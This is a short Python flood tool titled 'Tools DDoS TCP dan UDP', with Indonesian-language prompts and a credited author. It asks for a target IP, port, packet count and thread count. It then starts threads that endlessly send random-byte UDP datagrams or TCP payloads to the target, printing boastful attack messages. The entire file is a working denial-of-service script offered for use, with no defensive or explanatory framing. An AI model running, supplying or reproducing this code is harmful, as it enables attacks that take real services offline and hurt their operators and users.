#!/usr/bin/env python3
#Grazly ChoppaX
#Gyz Team Ddos
import random
import socket
import threading
import os
import time
import sys

print("""\u001b[31m 
TOOLS DDOS TCP DAN UDP
====== [ 𝐀𝐔𝐓𝐇𝐎𝐑 : 𝐆𝐑𝐀𝐙𝐋𝐘 𝐂𝐇𝐎𝐏𝐏𝐀 ] ======
====== [ 𝐃𝐈𝐒𝐂𝐎𝐑𝐃.𝐆𝐆//𝐂𝐇𝐎𝐏𝐏𝐀𝐗#4643 ] ======
====== [ 𝐡𝐭𝐭𝐩𝐬://𝐠𝐢𝐭𝐡𝐮𝐛
𝐜𝐨𝐦/𝐂𝐡𝐨𝐩𝐩𝐚𝐗 ] ====== """)
ip = str(input(" 𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐈𝐏 𝐓𝐚𝐫𝐠𝐞𝐭:"))
port = int(input(" 𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐏𝐨𝐫𝐭 𝐓𝐚𝐫𝐠𝐞𝐭:"))
choice = str(input(" 𝐘𝐚𝐤𝐢𝐧 𝐌𝐚𝐮 𝐃𝐝𝐨𝐬(y/n):"))
times = int(input(" 𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐉𝐮𝐦𝐥𝐚𝐡 𝐏𝐚𝐤𝐞𝐭:"))
threads = int(input(" 𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐉𝐮𝐦𝐥𝐚𝐡 𝐓𝐡𝐫𝐞𝐚𝐝𝐬:"))
def run():
	data = random._urandom(1234)
	i = random.choice(("[^]","[^]","[^]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" MENYERANG SITUS KE TARGET DAN MENGIRIMKAN VIRUS ")
		except:
			print("[!] MENYERANG SITUS KE TARGET DAN MENGIRIMKAN VIRUS ")

def run2():
	data = random._urandom(65534)
	i = random.choice(("[^]","[^]","[^]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" MEMBERIKAN KOPI DAN PERMEN ")
		except:
			s.close()
			print("[*] MEMBERIKAN KOPI DAN PERMEN ")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
